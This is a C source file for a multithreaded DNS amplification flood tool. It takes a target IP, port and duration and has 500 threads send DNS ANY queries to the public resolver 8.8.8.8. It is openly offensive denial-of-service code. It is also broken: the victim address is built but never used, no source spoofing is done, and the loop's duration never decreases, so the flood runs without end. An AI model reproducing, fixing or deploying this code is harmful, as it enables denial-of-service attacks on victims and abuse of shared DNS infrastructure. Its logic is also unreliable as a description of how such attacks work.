#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/udp.h>

#define NUM_THREADS 500
#define PACKET_SIZE 1024
#define DNS_SERVER "8.8.8.8"  // Open DNS Resolver

// DNS Query for ANY Record
unsigned char dns_query[] = {
    0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
    0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
    0x63, 0x6f, 0x6d, 0x00, 0x00, 0xff, 0x00, 0x01
};

struct thread_data {
    char *target_ip;
    int target_port;
    int duration;
};

void *dns_amplification(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(53);
    inet_pton(AF_INET, DNS_SERVER, &target.sin_addr);

    struct sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &victim.sin_addr);

    while (data->duration > 0) {
        sendto(sock, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(1000);
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target-ip> <target-port> <duration>\n", argv[0]);
        return 1;
    }

    struct thread_data data;
    data.target_ip = argv[1];
    data.target_port = atoi(argv[2]);
    data.duration = atoi(argv[3]);

    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, dns_amplification, (void *)&data);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
